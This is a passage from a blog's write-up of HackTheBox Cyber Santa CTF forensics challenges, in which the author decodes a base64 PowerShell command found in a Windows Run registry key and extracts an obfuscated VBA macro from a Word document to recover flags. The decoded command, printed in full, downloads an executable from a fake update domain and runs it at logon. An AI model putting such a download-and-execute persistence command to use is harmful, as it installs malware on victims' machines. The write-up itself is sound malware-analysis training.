    Software<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un <span class="o">(</span>Last modified: 2021-11-30 22:04:29 UTC+0000<span class="o">)</span>
        C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe <span class="nt">-ep</span> bypass <span class="nt">-enc</span> <span class="nv">JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA</span><span class="o">=</span> : cmFuZG9tCg <span class="o">(</span>PIDs: <span class="o">)</span>
...
</pre></table></code></div></div><p>Among the results we see that the <code class="language-plaintext highlighter-rouge">Software\Microsoft\Windows\CurrentVersion\Run</code> key contains a <code class="language-plaintext highlighter-rouge">powershell.exe</code> command that executes a base64 payload, which seemed suspicious. Decoding it, we see the flag.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA="</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
<span class="nv">$Path</span> <span class="o">=</span> <span class="s1">'C:\ProgramData\windows\win.exe'</span><span class="p">;</span><span class="k">if</span> <span class="o">(</span><span class="nt">-NOT</span><span class="o">(</span>Test-Path <span class="nt">-Path</span> <span class="nv">$Path</span> <span class="nt">-PathType</span> Leaf<span class="o">)){</span>Start-Process <span class="nv">$Path</span><span class="o">}</span><span class="k">else</span><span class="o">{</span><span class="nb">mkdir</span> <span class="s1">'C:\ProgramData\windows'</span><span class="p">;</span><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}"</span><span class="p">;</span>iex <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s2">"https://windowsliveupdater.com/win.exe"</span>,<span class="nv">$Path</span><span class="o">)</span><span class="p">;</span>Start-Process <span class="nv">$Path</span><span class="o">}</span>%
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}</code></p><h2 id="giveaway-day-4">Giveaway (Day 4)</h2><blockquote><p>Santa’s SOC team is working overtime during December due to Christmas phishing campaigns. A new team of malicious actors is targeting mainly those affected by the holiday spirit. Could you analyse the document and find the command &amp; control server?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">forensics_giveaway.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">forensics_giveaway.zip</code> was a <code class="language-plaintext highlighter-rouge">christmas_giveaway.docm</code>, a Word Document with the ability to execute macros. For safety reasons, I decided not to open it with Word, which will cause the malicious macro to execute.</p><p>To understand what the macro does, we can first unzip it, since <code class="language-plaintext highlighter-rouge">.docm</code> files are technically ZIP archives.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>unzip christmas_giveaway.docm 
</pre></table></code></div></div><p>This will produce a ton of files, but the file we are interested in is <code class="language-plaintext highlighter-rouge">word/vbaProject.bin</code>. This file is not human-readable but we can make use of <code class="language-plaintext highlighter-rouge">olevba</code> to retrieve the source code of the macro, which can be installed by running <code class="language-plaintext highlighter-rouge">pip install -U oletools</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>olevba vbaProject.bin
<span class="o">===============================================================================</span>
FILE: vbaProject.bin
Type: OLE
<span class="nt">-------------------------------------------------------------------------------</span>
VBA MACRO ThisDocument.cls 
<span class="k">in </span>file: vbaProject.bin - OLE stream: <span class="s1">'VBA/ThisDocument'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
...

    HPkXUcxLcAoMHOlj <span class="o">=</span> <span class="s2">"https://elvesfactory/"</span> &amp; Chr<span class="o">(</span>Asc<span class="o">(</span><span class="s2">"H"</span><span class="o">))</span> &amp; Chr<span class="o">(</span>84<span class="o">)</span> &amp; Chr<span class="o">(</span>Asc<span class="o">(</span><span class="s2">"B"</span><span class="o">))</span> &amp; <span class="s2">""</span> &amp; Chr<span class="o">(</span>123<span class="o">)</span> &amp; <span class="s2">""</span> &amp; Chr<span class="o">(</span>84<span class="o">)</span> &amp; Chr<span class="o">(</span>Asc<span class="o">(</span><span class="s2">"h"</span><span class="o">))</span> &amp; <span class="s2">"1"</span> &amp; Chr<span class="o">(</span>125 - 10<span class="o">)</span> &amp; Chr<span class="o">(</span>Asc<span class="o">(</span><span class="s2">"_"</span><span class="o">))</span> &amp; <span class="s2">"1s"</span> &amp; Chr<span class="o">(</span>95<span class="o">)</span> &amp; <span class="s2">"4"</span>
    cxPZSGdIQDAdRVpziKf <span class="o">=</span> <span class="s2">"_"</span> &amp; Replace<span class="o">(</span><span class="s2">"present"</span>, <span class="s2">"e"</span>, <span class="s2">"3"</span><span class="o">)</span> &amp; Chr<span class="o">(</span>85 + 10<span class="o">)</span>
    fqtSMHFlkYeyLfs <span class="o">=</span> Replace<span class="o">(</span><span class="s2">"everybody"</span>, <span class="s2">"e"</span>, <span class="s2">"3"</span><span class="o">)</span>
    fqtSMHFlkYeyLfs <span class="o">=</span> Replace<span class="o">(</span>fqtSMHFlkYeyLfs, <span class="s2">"o"</span>, <span class="s2">"0"</span><span class="o">)</span> &amp; <span class="s2">"_"</span>
    ehPsgfAcWaYrJm <span class="o">=</span> Chr<span class="o">(</span>Asc<span class="o">(</span><span class="s2">"w"</span><span class="o">))</span> &amp; <span class="s2">"4"</span> &amp; Chr<span class="o">(</span>110<span class="o">)</span> &amp; <span class="s2">"t"</span> &amp; Chr<span class="o">(</span>115<span class="o">)</span> &amp; <span class="s2">"_"</span> &amp; Chr<span class="o">(</span>Asc<span class="o">(</span><span class="s2">"f"</span><span class="o">))</span> &amp; <span class="s2">"0"</span> &amp; Chr<span class="o">(</span>121 - 7<span class="o">)</span> &amp; Chr<span class="o">(</span>95<span class="o">)</span>
    FVpHoEqBKnhPO <span class="o">=</span> Replace<span class="o">(</span><span class="s2">"christmas"</span>, <span class="s2">"i"</span>, <span class="s2">"1"</span><span class="o">)</span>
    FVpHoEqBKnhPO <span class="o">=</span> Replace<span class="o">(</span>FVpHoEqBKnhPO, <span class="s2">"a"</span>, <span class="s2">"4"</span><span class="o">)</span> &amp; Chr<span class="o">(</span>119 + 6<span class="o">)</span>

...
</pre></table></code></div></div><p>Among the extracted code was this partial URL, followed by lines that append things to it. I manually traced the code and got the following string, which contained the flag.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://elvesfactory/HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/forensics/" class="post-tag no-text-decoration" >forensics</a> <a href="/tags/rev/" class="post-tag no-text-decoration" >rev</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/crypto/" class="post-tag no-text-decoration" >crypto</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox CTF - Cyber Santa - rizemon's blog&url=https://rizemon.github.io/posts/htbcybersanta-ctf/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox CTF - Cyber Santa - rizemon's blog&u=https://rizemon.github.io/posts/htbcybersanta-ctf/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox CTF - Cyber Santa - rizemon's blog&url=https://rizemon.github.io/posts/htbcybersanta-ctf/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3><div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div></div></a></div><div class="card"> <a href="/posts/dsonus2021-protectthevaccine-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Protect The Vaccine</h3><div class="text-muted small"><p> Description A nation-supported hacker group is using their cutting edge technology to attack a company that develops vaccine. They roll their own crypto with a hope that it will be more secure....</p></div></div></a></div><div class="card"> <a href="/posts/computingday2020-ctf/"><div class="card-body"> <span class="timeago small" > Sep 6, 2020 <i class="unloaded">2020-09-06T14:23:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NUS Computing Day 2020 CTF by NUS Greyhats</h3><div class="text-muted small"><p> Crypto Spin the letter around (50 pts) Can you find the mystery message? yetz{pxevhfxmhvhfinmbgzwtr} To solve this challenge, we just need to apply the rotational cipher of 7 shifts on it. The ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/standcon2021-starcereal2-ctf/" class="btn btn-outline-primary"><p>STANDCON CTF - Star Cereal 2</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
